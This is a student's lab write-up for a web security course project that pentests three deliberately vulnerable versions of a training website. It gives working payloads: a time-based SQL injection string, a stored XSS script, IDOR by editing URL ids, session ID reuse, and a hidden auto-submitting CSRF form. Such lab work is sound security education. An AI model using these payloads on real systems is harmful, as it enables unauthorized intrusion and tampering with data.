# Project 8 - Pentesting Live Targets

Time spent: 7 hours spent in total

> Objective: Identify vulnerabilities in three different versions of the Globitek website: blue, green, and red.

The six possible exploits are:
* Username Enumeration
* Insecure Direct Object Reference (IDOR)
* SQL Injection (SQLi)
* Cross-Site Scripting (XSS)
* Cross-Site Request Forgery (CSRF)
* Session Hijacking/Fixation

Each version of the site has been given two of the six vulnerabilities. (In other words, all six of the exploits should be assignable to one of the sites.)

## Blue

### Vulnerability #1: SQL Injection (SQLi)

[x] **SQL Injection** : Most of the data input received by these websites is
  being sanitized properly. However, one of the three sites has one place where
  the input is not being sanitized before being used in an SQL query. Determine
  which color has the vulnerability.
  
Reading: [SQL injection](http://guides.codepath.com/websecurity/SQL-Injection)

  * [x] GIF Walkthrough:  ![alt text](/blue1.gif)

  * [x]  The Attacker injects the following sql command instead of the proper Salesperson's ID Number.
  ```html
  %27%20OR%20SLEEP(5)=0--%27
  ```
  * [x]  This causes the Database command to wait for 10 seconds while quering the data.
  
  
### Vulnerability #2: Session Hijacking/Fixation

[x] **Session Hijacking/Fixation** : Two of the three websites expire their active sessions and require users to re-login every 30 minutes. That is probably too aggressive for the real world, but it is better than the third site which allows sessions to be a year old, and never regenerates the session ID, even when the user agent string changes. This makes it vulnerable to both session hijacking and session fixation attacks.
  
  * [x] GIF Walkthrough:  ![alt text](/blue2.gif)

  * [x] The user can log in without a username or password by setting the current session ID to an old session ID from a previously logged in user.
  * [x]  To prevent this, the other sites regenerate the session ID every 30 minutes, thus preventing illegal logins with an expired session ID.
   
## Green

### Vulnerability #1: Username Enumeration

[x] **S Username Enumeration** : A careless developer mistake has created a username enumeration vulnerability. Determine which color has the vulnerability. You can use the existing username "jmonroe99" as a test. Next, figure out what mistake the developer made.
 
Reading: [Username Enumeration](http://guides.codepath.com/websecurity/Username-Enumeration)

  * [x] GIF Walkthrough:  ![alt text](/green1.gif)

  * [x] As you can see from above, the Green Website has the Username Enumeration error where the failure to login message differs for the Username that exists vs doesn't exist.
  * [x] Using Chrome's debugging tool, we can see that the developer uses different classes for when the error exists due to non-existant username (class="failed"), which is not defined in the /green/public/styles.css, but for other errors, the developer uses class="failure" which is described in the given styles.css.
  * [x] The "failure" class is applied an bold style in css while "failed" class doesn't.

### Vulnerability #2: Cross-Site Scripting

[x] **Cross-Site Scripting** : All three sites do a good job of protecting against a reflected XSS attack. However, one of the sites has a mistake which leaves the site vulnerable to a stored XSS attack. A reflected XSS attack would be easy to reveal, while a stored XSS does not provide instant feedback. You will need to log into the admin area and look through the CMS in order to "spring the trap" and find out if your attack succeeded. Determine which color has the vulnerability. Use your name in the XSS so that your results won't be confused with anyone else's (example: <script>alert('Mallory found the XSS!');</script>).
  
Reading: [Cross Site Scripting](http://guides.codepath.com/websecurity/Cross-Site-Scripting)

  * [x] GIF Walkthrough:  ![alt text](/green2.gif)

  * [x]  Attacker can inject an XSS in their feedback form.
  * [x]  Injected XSS Command:
```html
<script>alert(‘You are being attacked! Don’t Panic…');</script>
```
  * [x]  This XSS runs once the account holder checks their feedback page


## Red

### Vulnerability #2: Insecure Direct Object Reference

[x] **Insecure Direct Object Reference** : One of the three sites is missing code which would prevent some sensitive information from being made public. Determine which color has the vulnerability. Then, figure out what the other two sites did correctly to prevent the information leak.
  
Reading: [Insecure Direct Object Reference](http://guides.codepath.com/websecurity/Insecure-Direct-Object-Reference)

  * [x] GIF Walkthrough:  ![alt text](/red1.gif)

  * [x]  Above GIF show an attacker getting access to the hidden user's accounts that the attacker is not permitted to view. 
  * [x]  This is done through modifying the "id" parameter in the URL's to change the GET request.
  * [x]  Below are the accounts that the Attacker is able to access:
  ```html
  		- ID: 1 NAME: Daron Burke
  		- ID: 2 NAME: Sherry Trevino
  		- ID: 3 NAME: Irene Boliing
  		- ID: 4 NAME: Robert Hamilton
  		- ID: 5 NAME: Ken Barker
  		- ID: 6 NAME: Elizabeth Olson
  		- ID: 7 NAME: Samuel Hunter
  		- ID: 8 NAME: Kim Stanley
  		- ID: 9 NAME: Barbara Hinckley
  		- ID: 10 NAME: Testy McTesterson  <!-- Illegal access -->
  		- ID: 11 NAME: Lazy Lazyman       <!-- Illegal access -->
  ```

### Vulnerability #2: Cross-Site Request Forgery

[x] **Cross-Site Request Forgery** : One of the three sites does not have
  CSRF protections on the admin area. A clever attacker could design a form
  which would automatically submit form data to the staff area and take
  advantage of a logged in user's access permissions. Be the attacker and
  design a form which will make a change to the spelling of some database
  content. (For example, change the first user from "James" to "Jim", or change
  "Alabama" to "Alabamaaaa".) Then point the form action at each of the three
  sites to find out which color has the vulnerability. Do not neglect to be
  stealthy with your form—your unsuspecting, logged-in admin should neither see
  the form nor the results of the form submission.
  
 Reading: [Cross-Site Request Forgery](http://guides.codepath.com/websecurity/Cross-Site-Request-Forgery#csrf-post-request-attack)
 
  * [x] GIF Walkthrough:  ![alt text](/red2.gif)

  * [x]  Created a malicious page that utilizes the user's session to forge a request to the database:
```html
<html>
  <head>
    <title>NOT A FAKE FORM</title>
  </head>
  <body onload="document.my_form.submit()">
    <form action="https://104.198.208.81/red/public/staff/salespeople/edit.php?id=3" method="POST" name="my_form" style="display: none;" target="hidden_results" >
      <input type="text" name="first_name" value="GOTEEEM" />
      <input type="text" name="last_name" value="okurrrrr" />
      <input type="text" name="phone" value="777-777-7777" />
      <input type="text" name="email" value="RANDOM@email.COM" />
    </form>
    <iframe name="hidden_results" style="display: none;"></iframe>
  </body>
</html>
```
  * [x]  This page secretly makes a post request on page load and hides the outcome in a hidden iframe. 
  * [x]  As result, an account in the database is altered.

## Notes

Describe any challenges encountered while doing the work

## License

    Copyright [2020] [Michael Mayaguari]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
